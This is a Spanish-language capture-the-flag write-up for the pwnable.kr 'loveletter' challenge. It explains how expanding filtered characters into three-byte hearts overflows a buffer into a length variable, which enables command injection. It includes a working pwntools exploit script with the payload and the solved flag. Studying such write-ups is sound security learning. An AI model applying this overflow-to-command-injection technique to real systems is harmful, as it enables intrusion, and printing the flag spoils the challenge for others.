# loveletter

![loveletter](https://github.com/user-attachments/assets/1e9ff04b-c87e-475a-ab6a-937d611e6d2a)

```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

El programa ejecuta el comando `echo I love <nuestra_entrada> very much!"`. La función `protect` se encarga de filtrar los caracteres que llevan a una inyección de comandos sustituyendo los caracteres especiales con "♥". 

Dado que "♥" se representa con tres caracteres y no hay verificacion de limites podemos desbordar `input[256]` en `main`.

Seguido de `input[256]` se encuentra `len_prolog`, la longitud de `prolog`, que contiene "echo I love". 

Dado que el programa concatena `prolog`, `input` y `epilog`, si con el desbordamiento hacemos que la longitud de `prolog` sea 0 podemos escribir `cat flag ` en `input` y se ejecutará.

## Exploit
```py
#!/usr/bin/env python3
from pwn import *

elf = ELF("./loveletter")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "pwnable.kr"
port = 9034

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
        # you need r.interactive() !
    else:
        return process([elf.path])
r = start()

# rop = ROP(elf)
# rop = ROP(elf, libc)
# rop = ROP(elf, libc, ld)

#========= payloadploit here ===================
payload = b"cat flag "
payload += b"A" * (256 - len(payload) - 3) + b";\x00"
assert len(payload) == 255
r.sendline(payload)
r.interactive()
```

`I_Am_Y0ur_eternal_Lov3r`

